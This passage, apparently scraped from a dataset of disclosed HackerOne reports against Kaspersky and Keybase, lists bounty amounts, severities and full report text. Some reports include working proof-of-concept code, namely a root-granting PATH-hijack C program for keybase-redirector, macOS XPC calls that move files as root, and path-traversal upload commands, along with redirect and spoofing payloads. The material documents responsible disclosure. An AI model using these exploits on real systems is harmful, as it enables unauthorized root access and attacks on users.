Go to http://.../extract_address.html with your browser (I tried Firefox 62 but this should work in Chrome as well) and wait a few seconds.

An alert message will pop up telling your name and address. This information could be sent to a third party without you noticing anything.
Impact
This allows to deanonymize and to track users, the address being a particularly valuable piece of information. Privacy conscious users will still be recognized reliably, even if clearing cookies and using proxy servers. In addition, advertisers will certainly love the possibility of telling exactly where the person lives - makes for some great targeting.",https://hackerone.com/reports/430854,Moscow,Russia,Moscow,2018,10,30,13,30
Kaspersky,1001-5000,0.0,200m-1b,$300.00,Low,2.0,Improper Access Control - Generic,No Rate Limit On Forgot Password Page,hacker-yadav  submitted a report to Kaspersky.May 13th (2 years ago),https://hackerone.com/reports/1195618,Moscow,Russia,Moscow,2021,5,13,13,59
Kaspersky,1001-5000,0.0,200m-1b,"$2,500.00",Medium,5.45,Insecure Direct Object Reference (IDOR),Web protection component in Anti-Virus products family uses predictable links for certificate warnings,"palant  submitted a report to Kaspersky.Dec 18th (4 years ago)Summary
Websites can predict links used in certificate warnings, Safe Money prompts, anti-phishing warnings and similar pages. This allows them to initiate actions without the user's knowledge.
Description
The links used to override certificate warnings have the following format: https://<host>/?<link_id>_kis_cup_<GUID>_. Here, GUID is identical for all certificate warnings and link_id is a value that is being counted up continuously. So if a website can get hold of one such link, it can predict what future links will look like. This allows triggering actions on behalf of the user, e.g. overriding the wrong certificate for another website. Similarly, websites can permanently disable Safe Money protection for a banking website, the prompt there uses the same link format and the same link_id counter. And while an anti-phishing warning is overridden with http://touch.kaspersky.com/kis_cup_<GUID>_<link_id> it's once again the same values, so triggering this action automatically is possible as well.
The easiest way for a website to get hold of a valid link appears to be downloading its own certificate warning. Since certificate warnings are first-party as far as the website is concerned, it has complete access to them. The server needs to serve a valid certificate first so that the website can load, then switch to an invalid certificate so that any request will result in a certificate warning page from Kaspersky. The website can then download this warning page and read out the links from it.
Environment

Scope: Application
Product name: Kaspersky Internet Security
Product version: example: 19.0.0.1088
OS name and version (incl SP): Windows 10.0.17134
Attack type: Insecure Direct Object Reference
Maximum user privileges needed to reproduce your issue: no privileges

Steps to reproduce
Multiple steps to reproduce here to demonstrate various attacks possible, all tested in Firefox 64. First overriding a certificate:

Edit the file %WINDIR%\sysnative\drivers\etc\hosts as administrator and add the following line: 93.184.216.34 www.google.com (that's the IP address of example.com to simulate a MitM attack).
Go to https://www.google.com/ in your browser - note how Kaspersky will display a certificate warning page.
Now download the attached rebinding_server.py and certerror_override.html to some directory on your computer and run rebinding_server.py (Python 3 required). This will run an HTTPS server on https://localhost:5000/, with an additional server on http://localhost:5001/ that will make the primary server alternate between the first (supposedly valid) and second (invalid) SSL certificate.
Open https://localhost:5000/certerror_override.html in your browser (override the certificate warning, real attackers would use a website with a valid certificate).
The page masquerades as a warning from Kaspersky about your network not being protected, which is probably true if the attackers managed MiTM www.google.com and show you this page. Click the ""I understand the risks and wish to continue"" link. 
An additional warning by Kaspersky opens saying: ""You are about to go to an insecure web resource. Are you sure you want to continue?"" That warning is in line with what you already saw, so you click ""Continue.""
You will be redirected to https://www.google.com/ - the MiTM attack succeeded. The page says ""Not Found,"" the certificate warning is gone.

Now disabling Safe Money functionality:

Make sure that Safe Money functionality is enabled in Kaspersky settings and set to ""Prompt for action"" on first access (the default value).
Go to https://www.bankofamerica.com/ in your browser - note how Kaspersky will ask you whether you want to open this page in a safe browser.
Now download the attached rebinding_server.py and disable_safemoney.html to some directory on your computer and run rebinding_server.py (Python 3 required). This will run an HTTPS server on https://localhost:5000/, with an additional server on http://localhost:5001/ that will make the primary server alternate between the first (supposedly valid) and second (invalid) SSL certificate.
Open https://localhost:5000/disable_safemoney.html in your browser (override the certificate warning, real attackers would use a website with a valid certificate).
Note how you are being redirected to https://www.bankofamerica.com/ without any further warning, Safe Money functionality has been permanently disabled for this site. An actual attack might prefer to disable the functionality temporarily however, as this wouldn't leave any traces.

And overriding anti-phishing prompts:

Go to https://www.amtso.org/check-desktop-phishing-page/ in your browser - note how Kaspersky will prevent you from going there, indicating that it is a phishing page.
Now download the attached rebinding_server.py and phishing_override.html to some directory on your computer and run rebinding_server.py (Python 3 required). This will run an HTTPS server on https://localhost:5000/, with an additional server on http://localhost:5001/ that will make the primary server alternate between the first (supposedly valid) and second (invalid) SSL certificate.
Open https://localhost:5000/phishing_override.html in your browser (override the certificate warning, real attackers would use a website with a valid certificate).
Note how you are being redirected to https://www.amtso.org/check-desktop-phishing-page/ without any further confirmation, anti-phishing functionality will no longer warn stop you from going there until Kaspersky is restarted. There is a message being displayed saying ""Threat of data loss"" in the title and ""Allowed link"" in the message body, this is confusing and unlikely to make the user suspect anything.

Recommendations
Warning pages should not be first-party to the pages affected by them. Instead of directly serving HTML content within a 499 response, Kaspersky could produce a redirect to kis.v2.scr.kaspersky-labs.com here and produce the content under that location. This would prevent websites from accessing contents of such warning pages.
Even then, links triggering such important actions shouldn't be predictable. This is most easily achieved by using a real cryptographic signature such as HMAC-SHA256. A link like http://touch.kaspersky.com/?id=<link_id>&host=<host>&signature=<HMAC-SHA256(secret, link_id || host)> cannot be manipulated without knowing the user-specific secret which will hopefully never be exposed to the web.
Impact
Attackers able to MiTM user's internet connection (e.g. on a public WiFi) will be able to trick the user into unwittingly confirming a certificate override for high profile websites such as Google, thus essentially disabling MiTM protection offered by SSL.
Also, arbitrary websites will be able to disable Safe Money or anti-phishing protection for any website without any user interaction. Other Kaspersky Internet Security functionality might be similarly affected.",https://hackerone.com/reports/469372,Moscow,Russia,Moscow,2018,12,18,11,43
Kaspersky,1001-5000,0.0,200m-1b,"$2,500.00",High,7.95,Cross-site Scripting (XSS) - Generic,URL Advisor component in KIS products family is vulnerable to Universal XSS,"palant  submitted a report to Kaspersky.Dec 17th (4 years ago)Summary
In Microsoft Edge, URL Advisor UI is served as first-party content on every domain. So the XSS vulnerability I found in this UI automatically applies to all websites, it allows running code in the context of any domain.
Description
URL Advisor frame is located under https://www.google.com/<INJECT_ID>/ua/url_advisor_balloon.html and https://www.yahoocom/<INJECT_ID>/ua/url_advisor_balloon.html in Microsoft Edge (always the same INJECT_ID value). It gets its content from a message sent via window.postMessage() without validating message origin. Under some circumstances it will assign that data as link target, so a malicious website can make that link point to a javascript: URL. Clickjacking then allows making the user click that link - while sites like google.com use X-Frame-Options header to disallow framing, no such restrictions are in place for the url_advisor_balloon.html frame.
Environment

Scope: Application
Product name: Kaspersky Internet Security
Product version: 19.0.0.1088
OS name and version (incl SP): Windows 10.0.17134
Attack type: Universal XSS
Maximum user privileges needed to reproduce your issue: no privileges

Steps to reproduce

Download attached server.py and universal_xss.html to some directory on your computer and run server.py (Python 3 required). This is a very rudimentary HTTP server running on http://localhost:5000/, you could use some other web server as well.
Edit the file %WINDIR%\sysnative\drivers\etc\hosts as administrator and add the following line: 127.0.0.1 www.google.example.com. Normally, you would just use a subdomain of a domain you own - the host name has to start with ""www.google."" for URL Advisor to apply to it.
Open Microsoft Edge and go to http://www.google.example.com:5000/universal_xss.html
As advised by the page, move your mouse and click somewhere on the page.

You will see an alert message saying: ""Hi, this is JavaScript code running on www.google.com."" That's the result of the code alert('Hi, this JavaScript code is running on ' + document.domain) executing in the context of the Google website. Injecting code into any other domain would have been easily possible as well.
Recommendation
This user interface should never be served as first-party, even once the vulnerability here is fixed. Any XSS vulnerability in Kaspersky code automatically elevates to Universal XSS otherwise, this is too dangerous. Frankly, I don't see why it is done in this way with Microsoft Edge - in Firefox and Internet Explorer the same UI is always served via kis.v2.scr.kaspersky-labs.com, so vulnerabilities here don't affect other websites.
Impact
A malicious website can easily make users click by pretending to be a game. And while the user clicks, they will be allowing the attackers to inject code into various internet domains and exfiltrating data in the background.",https://hackerone.com/reports/463915,Moscow,Russia,Moscow,2018,12,17,14,0
Keybase,11-50,0.0,1m-10m,$500.00,No value,0.0,Open Redirect,[keybase.io] Open Redirect,"bobrov  submitted a report to Keybase.Sep 2nd (7 years ago)PoC
Code 44 BytesWrap lines Copy Download1https://keybase.io//www.google.com/%2f%2e%2e
HTTP Response:
Code 64 BytesWrap lines Copy Download1HTTP/1.1 303 See Other
2...
3Location: //www.google.com/%2f%2e%2e/Keybase  rewarded bobrov with a $500 bounty. Oct 29th (7 years ago)Thanks for the bug report. We have fixed it.maxtaco Keybase staff  closed the report and changed the status to Resolved. Oct 29th (7 years ago)bobrov   requested to disclose this report. Sep 24th (6 years ago)maxtaco Keybase staff  agreed to disclose this report. Sep 26th (6 years ago)  This report has been disclosed. Sep 26th (6 years ago)",https://hackerone.com/reports/87027,New York,United States,New York,2015,9,2,13,26
Keybase,11-50,0.0,1m-10m,$250.00,No value,0.0,Cryptographic Issues - Generic,Content Sniffing not disabled,"lalakhan  submitted a report to Keybase.Jul 20th (7 years ago)Issue description :-
There was no ""X-Content-Type-Options"" HTTP header with the value nosniff set in the response. The lack of this header causes that certain browsers, try to determine the content type and encoding of the response even when these properties are defined correctly. This can make the web application vulnerable against Cross-Site Scripting (XSS) attacks. E.g. the Internet Explorer and Safari treat responses with the content type text/plain as HTML, if they contain HTML tags.
Issue remediation :-
Set the following HTTP header at least in all responses which contain user input:
X-Content-Type-Options: nosniff
Request:
OPTIONS / HTTP/1.1
Cookie: guest=lgHZIDA2MzM4NmU5ZWQ1ZTU3NWIwNjI1NTBiNTBmMjBmYTA4zlWtXXXOAAFRgMDEIPoFWhfui0zP639i8xFbEpow%2Flv4DLBOwb9VZrNNhfWg
Host: keybase.io
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36
Accept: /
Response:
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Mon, 20 Jul 2015 20:43:44 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3
Connection: keep-alive
X-Powered-By: Express
Allow: GET
Strict-Transport-Security: max-age=31536000; includeSubdomains; preload",https://hackerone.com/reports/77081,New York,United States,New York,2015,7,20,20,48
Keybase,11-50,0.0,1m-10m,"$1,000.00",Low,2.0,Business Logic Errors,Claiming ownership of GitHub handles via forked GitHub gists.,"edoverflow  submitted a report to Keybase.Jan 21st (5 years ago)Description
An attacker can claim ownership of a GitHub user's handle if the user forks the attacker's gist with a verification snippet generated by the attacker pointing towards the user's handle.
PoC
With my colleague's permission (@jackds) I claimed their GitHub handle with this gist: https://gist.github.com/EdOverflow/ae2b07342dfd0c2793dcb763bca51770. They simply forked the gist, as seen here: https://gist.github.com/jackds1986/c722170d819e67b4fedb7447b84cd2b2. Keybase then imports the profile picture from @jackds' GitHub account and sets it as my Keybase profile picture.
Image F256102: Screenshot_from_2018-01-21_17-40-30.png 57.65 KiBZoom in Zoom out Copy Download
To make matters worse, anybody that now browses to @jackds' GitHub profile using the Keybase browser extension believe they are messaging @jackds' when in fact all the messages land in my inbox. The UI makes it look like I am @jackds and therefore completely breaks the confidentiality of the Keybase service.
Image F256105: keybase_issue.png 307.79 KiBZoom in Zoom out Copy Download
Mitigation
When verifying ownership of GitHub handles, ensure that the gist is not a fork. I believe it is possible to do this with the GitHub gist API.
Impact
Users can no longer trust GitHub handles on Keybase.2 attachments:F256102: Screenshot_from_2018-01-21_17-40-30.pngF256105: keybase_issue.pngmaxtaco Keybase staff  changed the status to Triaged. Jan 23rd (5 years ago)Repro'ed, thanks for the report.maxtaco Keybase staff  posted a comment. Jan 23rd (5 years ago)Ok, we've rolled out a fix, can you help us verify the fix? Thank you.
    
    
        
            
                
                
                
            
        
    
edoverflow   posted a comment. Jan 23rd (5 years ago)Thank you for the prompt response and the very impressive resolution time. I can confirm that I am now unable to claim a GitHub handle via a forked gist.maxtaco Keybase staff  closed the report and changed the status to Resolved. Jan 23rd (5 years ago)Keybase  rewarded edoverflow with a $1,000 bounty. Jan 23rd (5 years ago)We didn't think this is a high severity bug, but it did involve some creative social engineering, and we applaud the researcher for thinking about our product specifically, not just applying a generic checklist.maxtaco Keybase staff  updated the severity to low. Jan 23rd (5 years ago)
    
    
        
            
                
                
                
            
        
    
edoverflow   requested to disclose this report. Jan 23rd (5 years ago)Thank you very much for the very generous bounty. I would, hereby, kindly request we publicly disclose this report in order to inform fellow researchers and programs of your extremely impressive response to this finding.maxtaco Keybase staff  agreed to disclose this report. Jan 23rd (5 years ago)  This report has been disclosed. Jan 23rd (5 years ago)",https://hackerone.com/reports/307675,New York,United States,New York,2018,1,21,16,49
Keybase,11-50,0.0,1m-10m,$50.00,No value,0.0,Violation of Secure Design Principles,Content spoofing due to the improper behavior  of the not-found meesage,"saeedhashem  submitted a report to Keybase.Feb 7th (7 years ago)Hay ,
At dist.keybase.io , It's possible to inject text in the not-found message in order to trick the user to make him visit website or do something an attacker might be interested in .
PoC :
https://goo.gl/3WO6iH 
I've shortened this one because it's really long , it's needed to be on google chrome , maximized window , bookmarks bar hidden and screen with 1366 x 768 resolution in order to be displayed like image 1.png 
That was complicated , I know , but it was just to prove the point that it can be modified to be more convincing  .
here's   the simple PoC 
https://dist.keybase.io////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////However,it.has.been.moved.to.our.new.website.at.HTTP://EVIL.ATTACKER.COM////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
I think it's not a very good idea to return the user input in the not-found message body , I also think it's easy to fix .
Happy fixing ,
Enjoy your weekend ,",https://hackerone.com/reports/115230,New York,United States,New York,2016,2,7,17,11
Keybase,11-50,0.0,1m-10m,$100.00,Low,2.0,Business Logic Errors,Fix bypass of different processing of usernames on Hackernews,"mishre  submitted a report to Keybase.Mar 2nd (5 years ago)Description
In report https://hackerone.com/reports/307670 the reported identified a flow which abuses parsing differences between Keybase and Hackernews. Also the original reports is resolved there appears to be a bypass having the same impact by abusing upper-case letters.
Steps to reproduce

Browse to: https://news.ycombinator.com/user?iD=rbanffy&id=blaa
Click on the Keybase Extension icon.
Notice that the pop-up shows the username blaa while thehackernews page shows the username: rbanffy (See attached image).

Root cause
Keybase only searches for lower-case letters, however thehackernews allows upper-case ones to.
Impact
Users attempting to send a secure, sensitive message to a Keybase user can be tricked into sending that message to a malicious user instead.1 attachment:F268665: keybase.png",https://hackerone.com/reports/321444,New York,United States,New York,2018,3,2,17,59
Keybase,11-50,0.0,1m-10m,$100.00,No value,0.0,Information Disclosure,Full path disclosure at https://keybase.io/_/api/1.0/invitation_request.json,"s_p_q_r  submitted a report to Keybase.Jul 21st (7 years ago)When we send a POST-request to https://keybase.io/_/api/1.0/invitation_request.json with multiple full_name parameters, for example:

email=test@testmail.com&full_name=1&full_name=2

we get an error response, which contains infromation about the server paths and code:

TypeError: Object 1,2 has no method &#39;replace&#39;<br>  at Object.exports.faves.faves.full_name [as check] (/home/keybase/src/keybase/keybase/lib/checkers.iced:379:13)<br>  at InvitationRequestHandler.exports.Handler.Handler.get_input (/home/keybase/src/keybase/keybase/lib/websrv_base.iced:129:20)<br>
etc.
s_p_q_r   posted a comment. Jul 21st (7 years ago)Same for https://keybase.io/_/api/1.0/send-reset-pw.json and email_or_username parameter.s_p_q_r   posted a comment. Jul 21st (7 years ago)Same for https://keybase.io/_/api/1.0/signup.json and usernames_p_q_r   posted a comment. Updated Jul 21st (7 years ago)Same for:
URLParemetershttps://keybase.io/_/api/1.0/getsalt.jsonemail_or_usernamehttps://keybase.io/_/api/1.0/login.jsonemail_or_usernamehttps://keybase.io/_/api/1.0/user/lookup.jsonusernames, fieldshttps://keybase.io/_/api/1.0/user/discover.jsontwitterhttps://keybase.io/_/api/1.0/key/fetch.jsonpgp_key_idss_p_q_r   posted a comment. Jul 21st (7 years ago)Also maybe some methods that require authorization I didn't check.s_p_q_r   posted a comment. Updated Jul 21st (7 years ago)So, all in all the entire list of vulnerable resourses:
URLParemetershttps://keybase.io/_/api/1.0/invitation_request.jsonemailhttps://keybase.io/_/api/1.0/send-reset-pw.jsonemail_or_usernamehttps://keybase.io/_/api/1.0/signup.json.jsonusernamehttps://keybase.io/_/api/1.0/getsalt.jsonemail_or_usernamehttps://keybase.io/_/api/1.0/login.jsonemail_or_usernamehttps://keybase.io/_/api/1.0/user/lookup.jsonusernames, fieldshttps://keybase.io/_/api/1.0/user/discover.jsontwitterhttps://keybase.io/_/api/1.0/key/fetch.jsonpgp_key_idss_p_q_r   posted a comment. Jul 30th (7 years ago)Hello!
Any updates? Looks like fixed now (for a few of them at least).sagar_p   filed a duplicate (#78072) and was invited to participate in this report. Aug 4th (7 years ago)Keybase  rewarded s_p_q_r with a $100 bounty. Aug 4th (7 years ago)Good catch!sidney   closed the report and changed the status to Resolved. Aug 4th (7 years ago)s_p_q_r   posted a comment. Aug 5th (7 years ago)Thank you!s_p_q_r   requested to disclose this report. Aug 5th (7 years ago)  This report has been disclosed. Sep 4th (7 years ago)",https://hackerone.com/reports/77319,New York,United States,New York,2015,7,21,13,27
Keybase,11-50,0.0,1m-10m,"$5,000.00",High,7.6,Remote File Inclusion,"Keybase client (Windows 10): Write files anywhere in userland using relative path in ""download attachement"" feature","op1um  submitted a report to Keybase.Oct 13th (3 years ago)Summary
I've tested this vulnerability on Windows 10, with last keybase client.
If a user click on ""Download file"" during a chat, an attacker can write files anywhere in userland. When downloading a file from a chat, the file should always be written in ""Downloads"" folder.
Proof of concept
You need to use a linux operating system to send the files to the Windows 10 client, because you will need to create files with ""\"" characters in them.
Create a file and name it with a relative path, for example to write in C:\Users\USER\Desktop you can name the file: ""........\Desktop\proof.txt""
Then send it with a title to make the weird name of the file less noticeable by the victim.
You can do this with the commands:
Code 197 BytesWrap lines Copy Download1echo ""PoC Keybase"" > proof.txt
2cp proof.txt ..\\..\\..\\..\\Desktop\\proof.txt
3keybase chat upload testaccount2 ~/Desktop/keybase_bughunting/..\\..\\..\\..\\Desktop\\proof.txt --title ""Download me""
Then on the Windows client, click on the file to download it, a file called ""proof.txt"" is written in the folder ""C:\Users\USER\Desktop\""
Impact
An attacker could use this vulnerability to write files anywhere in userland.
Example of attack scenario
An attacker could use this vulnerability to perform dll hijacking attacks, by writing a dll in userland. This could lead to code execution.2 attachments:F606261: Screenshot_20191013_040910.pngF606262: result_bug_bounty.png",https://hackerone.com/reports/713006,New York,United States,New York,2019,10,13,2,28
Keybase,11-50,0.0,1m-10m,"$5,000.00",High,7.8,Privilege Escalation,Linux privilege escalation via trusted $PATH in keybase-redirector ,"mirchr  submitted a report to Keybase.Oct 22nd (4 years ago)keybase-redirector is a setuid root binary. keybase-redirector calls the fusermount binary using a relative path and the application trusts the value of $PATH. This allows a local, unprivileged user to trick the application to executing a custom fusermount binary as root.
Environment
CentOS Linux release 7.4.1708 (Core)
3.10.0-693.17.1.el7.x86_64
RPM info
Code 554 BytesWrap lines Copy Download1Name        : keybase
2Version     : 2.8.0.20181017144746.3efc4cbf3c
3Release     : 1
4Architecture: x86_64
5Install Date: Mon 22 Oct 2018 05:30:36 PM EDT
6Group       : Unspecified
7Size        : 273302678
8License     : BSD
9Signature   : RSA/SHA256, Wed 17 Oct 2018 10:55:21 AM EDT, Key ID 47484e50656d16c7
10Source RPM  : keybase-2.8.0.20181017144746.3efc4cbf3c-1.src.rpm
11Build Date  : Wed 17 Oct 2018 10:54:47 AM EDT
12Build Host  : 6ae61e160e87
13Relocations : (not relocatable)
14Summary     : Keybase command line client
15Description :
16Keybase command line client
An unprivileged user named user1 is used for this PoC.
Steps to reproduce
####1) Display privileges of user 1 - execute the id command
Code 139 BytesWrap lines Copy Download1[user1@localhost woot]$ id
2uid=1000(user1) gid=1000(user1) groups=1000(user1) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
####2) Create a custom fusermount application. This PoC will create /w00t as root. Arbitrary commands can be executed.
Code 209 BytesWrap lines Copy Download1cat >fusermount.c<<EOF
2#include <stdio.h>
3#include <stdlib.h>
4#include <sys/types.h>
5#include <unistd.h>
6
7int main(int argc, char **argv)
8{
9  setreuid(0,0);
10  system(""/usr/bin/touch /w00t"");
11  return(0);
12}
13EOF
####3) Compile fusermount.c
Code 36 BytesWrap lines Copy Download1gcc -Wall fusermount.c -o fusermount
####4) Verify that /w00t does not exist.
Code 87 BytesWrap lines Copy Download1[user1@localhost woot]$ ls -ld /w00t
2ls: cannot access /w00t: No such file or directory
####5) Prepend the PATH environment variable with a dot(for current working directory) and execute keybase-redirector which in turn will execute the malicious fusermount binary as root.
Code 53 BytesWrap lines Copy Download1env PATH=.:$PATH /usr/bin/keybase-redirector /keybase
####6) Enter the control-c sequence to kill the application.
Code 80 BytesWrap lines Copy Download1[user1@localhost woot]$ env PATH=.:$PATH /usr/bin/keybase-redirector /keybase
2^C
####7) Verify that /w00t exists
Code 106 BytesWrap lines Copy Download1[user1@localhost woot]$ ls -ld /w00t
2-rw-rw-r--. 1 root user1 0 Oct 22 16:34 /w00t
3[user1@localhost woot]$
Impact
Unauthorized root access is possible which impacts the confidentially, integrity, and availability of the system.",https://hackerone.com/reports/426944,New York,United States,New York,2018,10,22,21,31
Keybase,11-50,0.0,1m-10m,"$2,000.00",No value,0.0,Business Logic Errors,Keybase extension hostname-validation regular expression issue.,"edoverflow  submitted a report to Keybase.Jan 21st (5 years ago)Description
The following snippet in js/identities.js allows all hostnames ending in twitter.com, facebook.com, etc. to display the Keybase message window. The issue stems from the fact that you use \. instead of \\. in your regular expression.
Code 252 BytesWrap lines Copy Download1{
2    service: ""twitter"",
3    getUsername: function(loc) { return loc.pathname.split('/')[1]; },
4    locationMatches: new RegExp('\.twitter\.com/([\\w]+)[/]?$'),
5    originAndPathMatches: '\.twitter\.com/[\\w]+[/]?$',
6    css: ['body.ProfilePage']
7  },
PoC
Code 46 BytesWrap lines Copy Download1$ cat /etc/hosts
2IP_HERE totallynottwitter.com
Start up a little server and navigate to IP_HERE/edoverflow. Click on the Keybase extension's icon and the message window will pop up, tying @EdOverflow Twitter's identity to totallynottwitter.com.
Image F256084: Screenshot_from_2018-01-21_15-24-26.png 189.34 KiBZoom in Zoom out Copy Download
Mitigation
Make sure to use \\. in your regular expression.
Impact
An attacker can create a fake page with any of the white-listed hostnames, and the extension's messaging window will open on the page.1 attachment:F256084: Screenshot_from_2018-01-21_15-24-26.pngmaxtaco Keybase staff  changed the status to Triaged. Jan 21st (5 years ago)thank you for this report, PR up here: https://github.com/keybase/client/pull/10277/filesmaxtaco Keybase staff  posted a comment. Jan 26th (5 years ago)Should be fixed in the new extension. Can you confirm?
    
    
        
            
                
                
                
            
        
    
edoverflow   posted a comment. Jan 26th (5 years ago)Wow, once again, very impressive resolution time! I can confirm that this issue has been resolved.maxtaco Keybase staff  closed the report and changed the status to Resolved. Jan 26th (5 years ago)Fixed.Keybase  rewarded edoverflow with a $2,000 bounty. Jan 26th (5 years ago)maxtaco Keybase staff  posted a comment. Jan 26th (5 years ago)We think the researcher here did great work, and thought creatively about Keybase's application and how to break it. The bug was a minor escaping issue in the end, but one that could have been exploited with small amounts of social engineering.  Awesome job!
    
    
        
            
                
                
                
            
        
    
edoverflow   requested to disclose this report. Jan 26th (5 years ago)This is the best bug bounty program I have ever participated in — I am speechless. Thank you so much for bounty, @maxtaco and Keybase. You have motivated me to invest more time into helping secure your products now.maxtaco Keybase staff  agreed to disclose this report. Jan 26th (5 years ago)  This report has been disclosed. Jan 26th (5 years ago)",https://hackerone.com/reports/307672,New York,United States,New York,2018,1,21,16,31
Keybase,11-50,0.0,1m-10m,$250.00,No value,0.0,Violation of Secure Design Principles,"No rate limiting for sensitive actions (like ""forgot password"") enables user enumeration","paresh_parmar  submitted a report to Keybase.Jul 20th (7 years ago)Hi there,
I noticed a small information leak which allows an attacker to check whether an email address is associated with an account.
Steps to reproduce:
Send a POST-Request to the url POST /_/api/1.0/send-reset-pw.json HTTP/1.1 as the following example shows:
POST /_/api/1.0/send-reset-pw.json HTTP/1.1
Host: keybase.io
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: /
Cookie: guest=lgHZIDQ5ZjA0ZmY4YzE5YzBmZDdkOGZkMDQ3ZGZmZjczZjA4zlWtVuDOAAFRgMDEIEx%2BMZOb3r1Tv4NfNl%2Fsn5Mklyrd%2FgDZTXDwDLAusRJi
email_or_username=ed_aguillon@fandergroup%2ecom

After checking THOUSANDS of request i notice that there's no error,
Here's the responce after  1000 request:
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Mon, 20 Jul 2015 20:21:52 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 205
Connection: close
X-Powered-By: Express
Vary: X-HTTP-Method-Override
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=31536000; includeSubdomains; preload
{""status"":{""code"":203,""desc"":""user not found"",""name"":""BAD_LOGIN_USER_NOT_FOUND""},""csrf_token"":""lgHZIDQ5ZjA0ZmY4YzE5YzBmZDdkOGZkMDQ3ZGZmZjczZjA4zlWtWCbOAAFRgMDEIKUlcZOdMAo7T2X2Ee209zIYzRnWeuRICMnbn6U4GbEa""}

Suggested fix:
You should always return a status message like: ""If your email exists in our database, you'll receive a reset link"". That way an attacker cannot distinguish between the two cases.",https://hackerone.com/reports/77067,New York,United States,New York,2015,7,20,20,27
Keybase,11-50,0.0,1m-10m,"$5,000.00",High,7.95,Privilege Escalation,Privilege Escalation via Keybase Helper,"xpn  submitted a report to Keybase.Aug 20th (4 years ago)A privilege escalation vulnerability exists within the KeybaseHelper application available when installing the Keybase Desktop Application on MacOS.
The issue is exposed via a LaunchDaemon plist which is installed within /Library/LaunchDaemons/keybase.Helper.plist. This file is responsible for launching /Library/PrivilegedHelperTools/keybase.Helper for the registered mach port keybase.Helper.
If we take the source code located at https://github.com/keybase/client/blob/master/osx/Helper/KBHelper.m, we can see a number of exposed ""methods"" via an XPC connection, including:

remove - Ability to remove any file on the filesystem as the root user
move - Ability to move any file on the filesystem as the root user
createDirectory - Ability to create a directory as the root user, and provide attributes such as the owner UID/GID and permissions
addToPath - Add applications to the /usr/local/bin directory
kextInstall - Add and start kext 

Interacting with the helper via XPC takes place via the MPMessagePack framework, which is available from https://github.com/gabriel/MPMessagePack/blob/master/XPC/MPXPCClient.m.
If we craft a very simple POC, we can see that it is trivial to place files within dangerous locations:
Code 400 BytesWrap lines Copy Download1    NSError *error;
2    MPXPCClient *client = [[MPXPCClient alloc] initWithServiceName:@""keybase.Helper"" privileged:true];
3    [client connect:&error];
4    
5    // Moves any file from ""source"" to ""destination"" as the root user
6    [client sendRequest:@""move"" params:@[@{@""source"":@""/tmp/src"", @""destination"":@""/Library/dst""}] completion: ^(NSError *error, id value) {
7        NSLog(@""WORKS"");
8    }];
It does appear than an effort has been made to avoid executing arbitrary applications by the helper, for example, we can see the following comments within the """" method:
Code 168 BytesWrap lines Copy Download1    // Make sure the passed-in redirector binary points to a proper binary
2    // signed by Keybase, we don't want this to be able to run arbitrary code
3    // as root.
This doesn't stop us from elevating privileges however, for example, we can simply use the 'move' method to copy any file (or overwrite any file). As a simple example, below we can see a simple operation moving a plist file into /Library/LaunchDaemons/com.xpnsec.test.plist:
Code 215 BytesWrap lines Copy Download1    [client sendRequest:@""move"" params:@[@{@""source"":@""/tmp/elevate.plist"", @""destination"":@""/Library/LaunchDaemons/com.xpnsec.test.plist""}] completion: ^(NSError *error, id value) {
2        NSLog(@""WORKS"");
3    }];
On reboot, we see that our service is installed and executed as the root user.
Alternatively, we can simply copy our malicious payload using the above method to /Library/PrivilegedHelperTools/keybase.Helper and spawn via our XPC call.
Impact
The impact would be elevation of privileges from any user with permission to access the keybase.Helper XPC service (which is currently all users) to the root user on macOS.",https://hackerone.com/reports/397478,New York,United States,New York,2018,8,20,23,4
Keybase,11-50,0.0,1m-10m,$350.00,No value,0.0,None,Race conditions can be used to bypass invitation limit,"franjkovic  submitted a report to Keybase.Feb 6th (7 years ago)Hi,
I have received 3 invites from Chris (I might have screwed up the PGP email, but thanks anyway), added to my account https://keybase.io/josipfranjkovic. Using race conditions, I was able to send out a total of 7 invites to my throwaway emails, obviously bypassing the 3 invitations limit.
Here are the steps to reproduce:

Login to your Keybase account, which has >0 invitations left.
Go to https://keybase.io/account/invitations
Enter an email, and click the invitation button
A POST request will be sent to /_/api/1.0/send_invitation.json. Repeat this POST request multiple times in short time frame, and change the email POST parameter as needed.
Multiple invitations will be send, bypassing the limit. 

(I have reclaimed the invitations for further testing)
Best regards,
Josip",https://hackerone.com/reports/115007,New York,United States,New York,2016,2,6,1,41
Keybase,11-50,0.0,1m-10m,$500.00,Low,2.0,Violation of Secure Design Principles,Difference in query string parameter processing between Hacker News and Keybase Chrome extension spawns chat to incorrect user,"tomnomnom  submitted a report to Keybase.Jan 21st (5 years ago)Hello!
When using the Keybase Chrome extension and viewing a Hacker News profile page with an additional id parameter in the query string, Hacker News uses the username from the first id parameter, whereas the Keybase extension uses the username from the second id parameter.
Example URL: https://news.ycombinator.com/user?id=TomNomNom&id=edoverflow
Image F256097: Screenshot_from_2018-01-21_15-56-20.png 85.35 KiBZoom in Zoom out Copy Download
Note that this is the profile page for the Hacker News user TomNomNom, whereas the Keybase Chat modal is for the (in this case non-existent) Keybase user TornNomNom (i.e. with the first m replaced with an r and an n). In a real attack the attacker would register the Keybase account, use the same Avatar as the target, and probably choose a more convincing homograph than m -> rn
Impact
Users attempting to send a secure, sensitive message to a Keybase user can be tricked into sending that message to a malicious user instead.1 attachment:F256097: Screenshot_from_2018-01-21_15-56-20.png",https://hackerone.com/reports/307670,New York,United States,New York,2018,1,21,16,7
Keybase,11-50,0.0,1m-10m,$750.00,Medium,6.1,Privilege Escalation,From nobody to somebody,"u3mur4  submitted a report to Keybase.Jan 24th (4 years ago)Short description
